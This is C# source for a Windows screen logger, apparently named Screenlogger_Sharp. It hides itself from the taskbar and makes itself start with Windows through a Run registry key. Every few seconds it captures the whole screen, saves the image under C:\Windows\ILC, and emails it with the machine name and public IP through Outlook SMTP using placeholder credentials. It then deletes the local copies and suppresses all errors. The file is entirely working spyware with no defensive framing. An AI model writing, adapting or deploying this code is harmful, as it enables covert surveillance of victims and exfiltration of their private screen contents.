using System;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Net;
using System.Net.Mail;
using System.Threading;
using Microsoft.Win32;

namespace Screenlogger_Sharp
{
    public partial class Form1 : Form
    {
        int i = 1, a = 1;
        bool send = false;
        private MailMessage email;
        public Form1()
        {
            InitializeComponent();
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;

            if (pictureBox1.Image != null)
                pictureBox1.Image.Dispose();
        }
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;  // Turn on WS_EX_TOOLWINDOW
                return cp;
            }
        }
        private void Inicializar()
        {
            RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            reg.SetValue("Meudaxcs", Application.ExecutablePath.ToString());

        }
        private void Form1_Load(object sender, EventArgs e)
        {
            Inicializar();
            try
            {
                string diretorio = @"C:\Windows\ILC\";
                if (!Directory.Exists(diretorio))
                {
                    Directory.CreateDirectory(diretorio);
                }
                else
                {

                    DirectoryInfo di = new DirectoryInfo(diretorio);
                    foreach (FileInfo file in di.GetFiles())
                    {
                        file.Delete();
                    }
                    Directory.Delete(diretorio);
                    Thread.Sleep(1000);
                    Directory.CreateDirectory(diretorio);
                }
                Manage();
            }
            catch (Exception) { }
        }
        private void Manage()
        {
            try
            {
                while (true)
                {
                    TakePic();
                    SendPic();
                    Thread.Sleep(2000);
                    DeletePic();
                    Thread.Sleep(4000);
                }
            }
            catch (Exception) { }
        }
        private void TakePic()
        {
            try
            {
                Bitmap bw = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics g = Graphics.FromImage(bw);
                g.CopyFromScreen(0, 0, 0, 0, bw.Size);
                pictureBox1.Image = bw;
                bw.Save(@"C:\Windows\ILC\" + i++ + ".jpeg");
                bw.Dispose();
            }
            catch (Exception) { }
        }
        private void SendPic()
        {
            try
            {
                string hora = DateTime.Now.ToShortTimeString();
                string data = DateTime.Now.ToShortDateString();
                string ip = getIP();
                
                var NomePc = Environment.MachineName;
                email = new MailMessage();
                email.To.Add(new MailAddress("youremail@outlook.com"));
                email.From = new MailAddress("youremail@outlook.com");
                email.Subject = "New Pic";
                email.IsBodyHtml = true;
                email.Body = data + " <br> " + hora + "<br>IP: " + ip + "<br>Machine: " + NomePc;

                System.Net.Mail.Attachment aa;
                aa = new System.Net.Mail.Attachment(@"C:\Windows\ILC\" + a++ + ".jpeg");
                email.Attachments.Add(aa);

                SmtpClient cliente = new SmtpClient();
                cliente.Credentials = new System.Net.NetworkCredential("youremail@outlook.com", "yourpass");
                cliente.Host = "smtp-mail.outlook.com"; //case using gmail
                cliente.Port = 587;
                cliente.EnableSsl = true;
                cliente.Send(email);
                aa.Dispose();
                email.Dispose();
                send = true;
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString()); //if there is an error in the SMTP you can uncomment this line 
            }
        }
        int k = 0;
        private void DeletePic()
        {
            if (send)
            {
                try
                {
                    k++;
                    File.Delete(@"C:\Windows\ILC\" + k + ".jpeg");
                    send = false;
                }
                catch (Exception) { }
            }
        }
        private string getIP()
        {
            string ip;
            try
            {
                using (WebClient web = new WebClient())
                {
                    ip = web.DownloadString("https://wtfismyip.com/text"); //get IP
                }
            }
            catch (Exception)
            {
                ip = "Error";
            }
            return ip;
        }
    }
}

